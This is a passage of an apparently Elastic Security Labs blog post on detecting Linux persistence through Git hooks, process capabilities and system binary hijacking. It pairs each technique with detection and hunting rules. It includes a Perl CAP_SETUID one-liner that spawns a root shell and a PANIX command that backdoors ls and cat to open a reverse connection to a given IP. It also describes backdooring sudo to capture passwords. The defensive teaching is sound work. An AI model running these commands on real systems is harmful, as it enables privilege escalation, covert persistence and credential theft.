<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th>Category</th><th>Coverage</th></tr></thead><tbody><tr><td>File</td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_git_hook_file_creation.toml">Git Hook Created or Modified</a></td></tr><tr><td>Process</td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_git_hook_process_execution.toml">Git Hook Child Process</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_git_hook_execution.toml">Git Hook Command Execution</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/execution_shell_evasion_linux_binary.toml">Linux Restricted Shell Breakout via Linux Binary(s)</a></td></tr><tr><td>Network</td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_git_hook_netcon.toml">Git Hook Egress Network Connection</a></td></tr></tbody></table></div>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="hunting-for-persistence-through-t1546---git" class="absolute -top-32"></span>Hunting for persistence through T1546 - Git</h3>
<p>Hunting for Git Hook/Pager persistence can be conducted through ES|QL and OSQuery. Potential indicators include file creations in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.git/hook/</code> directories, Git Hook executions, and the modification/creation of Git configuration files. The <a href="https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_git_hook_pager.toml">Git Hook/Pager Persistence</a> hunting rule has several ES|QL and OSQuery queries that will aid in detecting this technique.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="t1548---abuse-elevation-control-mechanism-process-capabilities" class="absolute -top-32"></span>T1548 - abuse elevation control mechanism: process capabilities</h2>
<p><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html">Process capabilities</a> are a fine-grained access control mechanism that allows the division of the root user&#x27;s privileges into distinct units. These capabilities can be independently enabled or disabled for processes, and are used to enhance security by limiting the privileges of processes. Instead of granting a process full root privileges, only the necessary capabilities are assigned, reducing the risk of exploitation. This approach follows the principle of least privilege.</p>
<p>To better understand them, some use cases for process capabilities are e.g. assigning <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">CAP_NET_BIND_SERVICE</code> to a web server that needs to bind to port 80, assigning <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">CAP_NET_RAW</code> to tools that need access to network interfaces or assigning <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">CAP_DAC_OVERRIDE</code> to backup software requiring access to all files. By leveraging these capabilities, processes are capable of performing tasks that are usually only possible with root access.</p>
<p>While process capabilities were developed to enhance security, once root privileges are acquired, attackers can abuse them to maintain persistence on a compromised system. By setting specific capabilities on binaries or scripts, attackers can ensure their malicious processes can operate with elevated privileges and allow for an easy way back to root access in case of losing it. Additionally, misconfigurations may allow attackers to escalate privileges.</p>
<p>Some process capabilities can be (ab)used to establish persistence, escalate privileges, access sensitive data, or conduct other tasks. Process capabilities that can do this include, but are not limited to:</p>
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">CAP_SYS_MODULE</code> (allows loading/unloading of kernel modules)</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">CAP_SYS_PTRACE</code> (enables tracing and manipulation of other processes)</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">CAP_DAC_OVERRIDE</code> (bypasses read/write/execute checks)</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">CAP_DAC_READ_SEARCH</code> (grants read access to any file on the system)</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">CAP_SETUID</code>/<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">CAP_SETGID</code> (manipulate UID/GID)</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">CAP_SYS_ADMIN</code> (to be honest, this just means root access)</li>
</ul>
<p>A simple way of establishing persistence is to grant the process <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">CAP_SETUID</code> or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">CAP_SETGID</code> capabilities (this is similar to setting the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">SUID</code>/<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">SGID</code> bit to a process, which we discussed in <a href="https://www.elastic.co/security-labs/primer-on-persistence-mechanisms">the previous persistence blog</a>). But all of the ones above can be used, be a bit creative here! MITRE does not have a technique dedicated to process capabilities. Similar to Setuid/Setgid, this technique can be leveraged for both privilege escalation and persistence. The most logical technique to add this mechanism to (based on the existing structure of the MITRE ATT&amp;CK framework) would be <a href="https://attack.mitre.org/techniques/T1548/">T1548</a>.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="persistence-through-t1548---process-capabilities" class="absolute -top-32"></span>Persistence through T1548 - process capabilities</h3>
<p>Let’s leverage PANIX to set up a process with <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">CAP_SETUID</code> process capabilities by running:</p>
<pre><code>&gt; sudo ./panix.sh --cap --default
[+] Capability setuid granted to /usr/bin/perl
[-] ruby, is not present on the system.
[-] php is not present on the system.
[-] python is not present on the system.
[-] python3, is not present on the system.
[-] node is not present on the system.</code></pre>
<p>PANIX will by-default check for a list of processes that are easily exploitable after granting <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">CAP_SETUID</code> capabilities. You can use <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">--custom</code> and specify <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">--capability</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">--binary</code> to test some of your own.</p>
<p>If your system has <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Perl</code>, you can take a look at <a href="https://gtfobins.github.io/gtfobins/perl/">GTFOBins</a> to find how to escalate privileges with this capability set.</p>
<pre><code>/usr/bin/perl -e &#x27;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/sh&quot;;&#x27;
# whoami
root</code></pre>
<p>Looking at the logs in Discover, we can see the following happening:</p>
<p></p>
<p>We can see PANIX being executed with <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">uid=0</code> (root), which grants <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">cap_setuid+ep</code> (effective and permitted) to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/bin/perl</code>. Effective indicates that the capability is currently active for the process, while permitted indicates that the capability is allowed to be used by the process. Note that all events with <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">uid=0</code> have all effective/permitted capabilities set. After granting this capability and dropping down to user permissions, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">perl</code> is executed and manipulates its own process UID to obtain root access. Feel free to try out different binaries/permissions.</p>
<p>As we have quite an extensive list of rules related to process capabilities (for discovery, persistence and privilege escalation activity), we will not list all of them here. Instead, you can take a look at <a href="https://www.elastic.co/security-labs/unlocking-power-safely-privilege-escalation-via-linux-process-capabilities">this blog post</a>, digging deeper into this topic.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="hunting-for-persistence-through-t1548---process-capabilities" class="absolute -top-32"></span>Hunting for persistence through T1548 - process capabilities</h3>
<p>Hunting for process capability persistence can be done through ES|QL. We can either do a general hunt and find non uid 0 binaries with capabilities set, or hunt for specific potentially dangerous capabilities. To do so, we created the <a href="https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/privilege_escalation_via_process_capabilities.toml">Process Capability Hunting</a> rule.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="t1554---compromise-host-software-binary-hijacking-system-binaries" class="absolute -top-32"></span>T1554 - compromise host software binary: hijacking system binaries</h2>
<p>After gaining access to a system and, if necessary, escalating privileges to root access, system binary hijacking/wrapping is another option to establish persistence. This method relies on the trust and frequent execution of system binaries by a user.</p>
<p>System binaries, located in directories like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/bin</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/sbin</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/bin</code>, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/sbin</code> are commonly used by users/administrators to perform basic tasks. Attackers can hijack these system binaries by replacing or backdooring them with malicious counterparts. System binaries that are used often such as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">cat</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ls</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">cp</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">mv</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">less</code> or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sudo</code> are perfect candidates, as this mechanism relies on the user executing the binary.</p>
<p>There are multiple ways to establish persistence through this method. The attacker may manipulate the system’s <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">$PATH</code> environment variable to prioritize a malicious binary over the regular system binary. Another method would be to replace the real system binary, executing arbitrary malicious code on launch, after which the regular command is executed.</p>
<p>Attackers can be creative in leveraging this technique, as any code can be executed. For example, the system-wide <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sudo</code>/<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">su</code> binaries can be backdoored to capture a password every time a user attempts to run a command with <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sudo</code>. Another method can be to establish a reverse connection every time a binary is executed or a backdoor binary is called on each binary execution. As long as the attacker hides well and no errors are presented to the user, this technique is difficult to detect. MITRE does not have a direct reference to this technique, but it probably fits <a href="https://attack.mitre.org/techniques/T1554/">T1554</a> best.</p>
<p>Let’s take a look at what hijacking system binaries might look like.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="persistence-through-t1554---hijacking-system-binaries" class="absolute -top-32"></span>Persistence through T1554 - hijacking system binaries</h3>
<p>The implementation of system binary hijacking in PANIX leverages the wrapping of a system binary to establish a reverse connection to a specified IP. You can reference this <a href="https://github.com/Aegrah/PANIX/blob/main/panix.sh#L2391-L2401">example</a> or set it up by executing:</p>
<pre><code>&gt; sudo ./panix.sh --system-binary --default --ip 192.168.1.1 --port 2016
&gt; [+] cat backdoored successfully.
&gt; [+] ls backdoored successfully.</code></pre>
<p>Now, execute <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ls</code> or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">cat</code> to establish persistence. Let’s analyze the logs.</p>
<p></p>
<p>In the figure above we see PANIX executing, moving <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/bin/ls</code> to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/bin/ls.original</code>. It then backdoors <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/bin/ls</code> to execute arbitrary code, after which it calls <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/bin/ls.original</code> in order to trick the user. Afterwards, we see <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">bash</code> setting up the reverse connection. The copying/renaming of system binaries and the hijacking of the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sudo</code> binary are captured in the following detection rules.</p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th>Category</th><th>Coverage</th></tr></thead><tbody><tr><td>File</td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/defense_evasion_binary_copied_to_suspicious_directory.toml">System Binary Moved or Copied</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/privilege_escalation_sudo_hijacking.toml">Potential Sudo Hijacking</a></td></tr></tbody></table></div>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="hunting-for-persistence-through-t1554---hijacking-system-binaries" class="absolute -top-32"></span>Hunting for persistence through T1554 - hijacking system binaries</h3>
<p>This activity should be very uncommon, and therefore the detection rules above can be leveraged for hunting. Another way of hunting for this activity could be assembling a list of uncommon binaries to spawn child processes. To aid in this process we created the <a href="https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_unusual_system_binary_parent.toml">Unusual System Binary Parent (Potential System Binary Hijacking Attempt)</a> hunting rule.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="conclusion" class="absolute -top-32"></span>Conclusion</h2>
<p>In this part of our “Linux Detection Engineering” series, we explored more advanced Linux persistence techniques and detection strategies, including init systems, run control scripts, message of the day, udev (rules), package managers, Git, process capabilities, and system binary hijacking. If you missed the previous part on persistence, catch up <a href="https://www.elastic.co/security-labs/primer-on-persistence-mechanisms">here</a>.</p>
<p>We did not only explain each technique but also demonstrated how to implement them using <a href="https://github.com/Aegrah/PANIX">PANIX</a>. This hands-on approach allowed you to assess detection capabilities in your own security setup. Our discussion included detection and endpoint rule coverage and referenced effective hunting strategies, from ES|QL aggregation queries to live OSQuery hunts.</p>
<p>We hope you&#x27;ve found this format informative. Stay tuned for more insights into Linux detection engineering. Happy hunting!</p></div></div></div><div class="hidden lg:flex lg:col-span-1 text-sm lg:flex-col lg:space-y-6"><div class="toc"><h4 class="font-bold leading-tight text-lg md:text-2xl mb-3">Jump to section</h4><ul class="flex flex-col space-y-2"><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/sequel-on-persistence-mechanisms#introduction"><span>Introduction</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/sequel-on-persistence-mechanisms#setup-note"><span>Setup&nbsp;note</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/sequel-on-persistence-mechanisms#t1037---boot-or-logon-initialization-scripts-init"><span>T1037 -&nbsp; boot or logon initialization scripts:&nbsp;Init</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/sequel-on-persistence-mechanisms#t1037---boot-or-logon-initialization-scripts-system-v-init"><span>T1037 -&nbsp; boot or logon initialization scripts: System V&nbsp;init</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/sequel-on-persistence-mechanisms#begin-init-info"><span>BEGIN INIT&nbsp;INFO</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/sequel-on-persistence-mechanisms#end-init-info"><span>END INIT&nbsp;INFO</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-8" href="/security-labs/sequel-on-persistence-mechanisms#persistence-through-t1037---system-v-init"><span>Persistence through T1037 -&nbsp; System V&nbsp;init</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-8" href="/security-labs/sequel-on-persistence-mechanisms#hunting-for-t1037---system-v-init"><span>Hunting for T1037 -&nbsp; System V&nbsp;init</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/sequel-on-persistence-mechanisms#t1037---boot-or-logon-initialization-scripts-upstart"><span>T1037 -&nbsp; boot or logon initialization scripts:&nbsp;Upstart</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/sequel-on-persistence-mechanisms#t1037004---boot-or-logon-initialization-scripts-run-control-rc-scripts"><span>T1037.004 -&nbsp; boot or logon initialization scripts: run control (RC)&nbsp;scripts</span></a></li></ul><button class="border-t border-white/20 w-full mt-3 py-2 flex items-center space-x-1 text-xs font-medium uppercase tracking-wide hover:text-white"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="w-3 h-3"><path d="M10.75 4.75a.75.75 0 00-1.5 0v4.5h-4.5a.75.75 0 000 1.5h4.5v4.5a.75.75 0 001.5 0v-4.5h4.5a.75.75 0 000-1.5h-4.5v-4.5z"></path></svg><span>Show more</span></button></div><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 md:p-2 sm:p-4 md:px-6 md:py-4 rounded-xl"><h4 class="font-bold leading-tight text-lg md:text-2xl mb-3">Elastic Security Labs Newsletter</h4><div><a target="_blank" class="button inline-flex" href="https://www.elastic.co/security-labs/newsletter?utm_source=security-labs">Sign Up</a></div></div></div></div><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 md:p-2 sm:p-4 md:px-6 md:py-4 rounded-xl my-5 md:my-10 max-w-3xl mx-auto flex flex-col items-center shadow-2xl"><h4 class="font-bold leading-tight text-lg md:text-2xl">Share this article</h4><div class="flex flex-wrap items-center justify-center mt-4 space-x-4"><a class="flex items-center space-x-2 button" href="https://twitter.com/intent/tweet?text=Linux Detection Engineering - A Sequel on Persistence Mechanisms&amp;url=https://www.elastic.co/security-labs/sequel-on-persistence-mechanisms" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Twitter" title="Share this article on Twitter"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M23.954 4.569c-.885.389-1.83.653-2.825.772a4.98 4.98 0 002.187-2.746 9.955 9.955 0 01-3.157 1.204 4.98 4.98 0 00-8.49 4.54A14.128 14.128 0 011.69 3.05a4.98 4.98 0 001.54 6.638A4.94 4.94 0 011.2 8.62v.06a4.98 4.98 0 004 4.87 4.94 4.94 0 01-2.24.086 4.98 4.98 0 004.64 3.45A9.97 9.97 0 010 20.35a14.075 14.075 0 007.59 2.22c9.16 0 14.17-7.583 14.17-14.17 0-.217-.005-.434-.015-.65a10.128 10.128 0 002.485-2.58l-.001-.001z"></path></svg><span>Twitter</span></a><a class="flex items-center space-x-2 button" href="https://www.facebook.com/sharer/sharer.php?u=https://www.elastic.co/security-labs/sequel-on-persistence-mechanisms" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Facebook" title="Share this article on Facebook"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M22.5 12c0-5.799-4.701-10.5-10.5-10.5S1.5 6.201 1.5 12c0 5.301 3.901 9.699 9 10.401V14.4h-2.7v-2.7h2.7v-2.1c0-2.7 1.8-4.2 4.2-4.2 1.2 0 2.1.1 2.4.2v2.4h-1.5c-1.2 0-1.5.6-1.5 1.5v1.8h3l-.3 2.7h-2.7V22C18.599 21.3 22.5 17.301 22.5 12z"></path></svg><span>Facebook</span></a><a class="flex items-center space-x-2 button" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://www.elastic.co/security-labs/sequel-on-persistence-mechanisms&amp;title=Linux Detection Engineering - A Sequel on Persistence Mechanisms" target="_blank" rel="noopener noreferrer" aria-label="Share this article on LinkedIn" title="Share this article on LinkedIn"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"></path></svg><span>LinkedIn</span></a><a class="flex items-center space-x-2 button" href="https://reddit.com/submit?url=https://www.elastic.co/security-labs/sequel-on-persistence-mechanisms&amp;title=Linux Detection Engineering - A Sequel on Persistence Mechanisms" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Reddit" title="Share this article on Reddit"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill-rule="evenodd" clip-rule="evenodd" d="M24 12C24 18.6274 18.6274 24 12 24C5.37258 24 0 18.6274 0 12C0 5.37258 5.37258 0 12 0C18.6274 0 24 5.37258 24 12ZM19.6879 11.0584C19.8819 11.3352 19.9916 11.6622 20.004 12C20.0091 12.3306 19.9205 12.656 19.7485 12.9384C19.5765 13.2208 19.3281 13.4488 19.032 13.596C19.0455 13.7717 19.0455 13.9483 19.032 14.124C19.032 16.812 15.9 18.996 12.036 18.996C8.172 18.996 5.04 16.812 5.04 14.124C5.02649 13.9483 5.02649 13.7717 5.04 13.596C4.80919 13.49 4.6042 13.335 4.43923 13.1419C4.27427 12.9487 4.15327 12.722 4.08462 12.4775C4.01598 12.2329 4.00133 11.9764 4.04169 11.7256C4.08205 11.4748 4.17646 11.2358 4.31837 11.0251C4.46028 10.8145 4.6463 10.6372 4.86354 10.5056C5.08078 10.3739 5.32404 10.2911 5.57646 10.2629C5.82889 10.2346 6.08444 10.2616 6.32541 10.3419C6.56638 10.4222 6.78701 10.5539 6.972 10.728C8.35473 9.79023 9.98146 9.27718 11.652 9.252L12.54 5.088C12.55 5.03979 12.5694 4.99405 12.5972 4.95341C12.625 4.91277 12.6605 4.87805 12.7018 4.85127C12.7431 4.82448 12.7894 4.80615 12.8378 4.79735C12.8862 4.78855 12.9359 4.78945 12.984 4.8L15.924 5.388C16.0676 5.14132 16.2944 4.9539 16.5637 4.85937C16.833 4.76484 17.1272 4.7694 17.3934 4.87222C17.6597 4.97505 17.8806 5.1694 18.0164 5.42041C18.1523 5.67141 18.1942 5.96262 18.1348 6.24177C18.0753 6.52092 17.9182 6.76972 17.6918 6.94352C17.4654 7.11732 17.1845 7.20473 16.8995 7.19006C16.6144 7.1754 16.3439 7.05962 16.1366 6.8635C15.9292 6.66738 15.7985 6.40378 15.768 6.12L13.2 5.58L12.42 9.324C14.0702 9.3594 15.6749 9.87206 17.04 10.8C17.2839 10.566 17.5902 10.4074 17.9221 10.3436C18.254 10.2797 18.5973 10.3132 18.9106 10.4401C19.2239 10.5669 19.4939 10.7817 19.6879 11.0584ZM8.20624 12.5333C8.07438 12.7307 8.004 12.9627 8.004 13.2C8.004 13.5183 8.13043 13.8235 8.35547 14.0485C8.58051 14.2736 8.88574 14.4 9.204 14.4C9.44134 14.4 9.67335 14.3296 9.87068 14.1978C10.068 14.0659 10.2218 13.8785 10.3127 13.6592C10.4035 13.4399 10.4272 13.1987 10.3809 12.9659C10.3346 12.7331 10.2204 12.5193 10.0525 12.3515C9.8847 12.1836 9.67089 12.0694 9.43811 12.0231C9.20533 11.9768 8.96405 12.0005 8.74478 12.0913C8.52551 12.1822 8.33809 12.336 8.20624 12.5333ZM12.012 17.424C13.0771 17.4681 14.1246 17.1416 14.976 16.5V16.548C15.0075 16.5173 15.0327 16.4806 15.05 16.4402C15.0674 16.3997 15.0766 16.3563 15.0772 16.3122C15.0777 16.2682 15.0696 16.2245 15.0533 16.1837C15.0369 16.1428 15.0127 16.1055 14.982 16.074C14.9513 16.0425 14.9146 16.0173 14.8742 16C14.8337 15.9826 14.7903 15.9734 14.7462 15.9728C14.7022 15.9723 14.6585 15.9804 14.6177 15.9967C14.5768 16.0131 14.5395 16.0373 14.508 16.068C13.7797 16.5904 12.895 16.8487 12 16.8C11.1061 16.8399 10.2255 16.5732 9.504 16.044C9.44182 15.993 9.36289 15.9669 9.28256 15.9708C9.20222 15.9748 9.12622 16.0085 9.06935 16.0653C9.01247 16.1222 8.97879 16.1982 8.97484 16.2786C8.97089 16.3589 8.99697 16.4378 9.048 16.5C9.89937 17.1416 10.9469 17.4681 12.012 17.424ZM14.0933 14.2458C14.2907 14.3776 14.5227 14.448 14.76 14.448L14.748 14.496C14.9107 14.4978 15.0721 14.4664 15.2223 14.4038C15.3725 14.3413 15.5084 14.2488 15.6218 14.1321C15.7352 14.0154 15.8236 13.8768 15.8818 13.7248C15.9399 13.5728 15.9665 13.4106 15.96 13.248C15.96 13.0107 15.8896 12.7787 15.7578 12.5813C15.6259 12.384 15.4385 12.2302 15.2192 12.1393C14.9999 12.0485 14.7587 12.0248 14.5259 12.0711C14.2931 12.1174 14.0793 12.2316 13.9115 12.3995C13.7436 12.5673 13.6294 12.7811 13.5831 13.0139C13.5368 13.2467 13.5605 13.4879 13.6513 13.7072C13.7422 13.9265 13.896 14.1139 14.0933 14.2458Z" fill="currentColor"></path></svg><span>Reddit</span></a></div></div></article></main><footer class="mt-auto text-xs md:text-sm"><div class="container py-6 flex flex-col md:flex-row gap-2 md:gap-0 justify-between items-center"><div class="text-zinc-300"><nav><ul class="flex space-x-4"><li><a class="hover:text-white font-medium" href="/security-labs/sitemap.xml">Sitemap</a></li><li><a class="hover:text-white font-medium flex items-center space-x-1" href="https://elastic.co?utm_source=elastic-search-labs&amp;utm_medium=referral&amp;utm_campaign=search-labs&amp;utm_content=footer"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="inline-block w-3 h-3"><path stroke-linecap="round" stroke-linejoin="round" d="M13.5 6H5.25A2.25 2.25 0 003 8.25v10.5A2.25 2.25 0 005.25 21h10.5A2.25 2.25 0 0018 18.75V10.5m-10.5 6L21 3m0 0h-5.25M21 3v5.25"></path></svg><span>Elastic.co</span></a></li><li><a class="hover:text-white font-medium flex items-center space-x-1" href="https://twitter.com/elasticseclabs"><svg class="w-4 h-4 inline-block w-3 h-3" viewBox="0 0 24 24"><path fill="currentColor" d="M23.954 4.569c-.885.389-1.83.653-2.825.772a4.98 4.98 0 002.187-2.746 9.955 9.955 0 01-3.157 1.204 4.98 4.98 0 00-8.49 4.54A14.128 14.128 0 011.69 3.05a4.98 4.98 0 001.54 6.638A4.94 4.94 0 011.2 8.62v.06a4.98 4.98 0 004 4.87 4.94 4.94 0 01-2.24.086 4.98 4.98 0 004.64 3.45A9.97 9.97 0 010 20.35a14.075 14.075 0 007.59 2.22c9.16 0 14.17-7.583 14.17-14.17 0-.217-.005-.434-.015-.65a10.128 10.128 0 002.485-2.58l-.001-.001z"></path></svg><span>@elasticseclabs</span></a></li></ul></nav></div><div class="flex flex-col space-y-1 text-zinc-300"><p>© <!-- -->2024<!-- -->. Elasticsearch B.V. All Rights Reserved.</p></div></div></footer></main></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"article":{"title":"Linux Detection Engineering - A Sequel on Persistence Mechanisms","slug":"sequel-on-persistence-mechanisms","date":"2024-08-30","description":"In this final part of this Linux persistence series, we'll continue exploring persistence mechanisms on Linux systems, focusing on more advanced techniques and how to detect them.","image":"sequel-on-persistence-mechanisms.jpg","subtitle":"A walkthrough on how threat actors establish persistence on Linux systems and how to hunt for these techniques.","tags":["linux","persistence"],"body":{"raw":"\n## Introduction\n\nIn this third part of the [Linux Detection Engineering 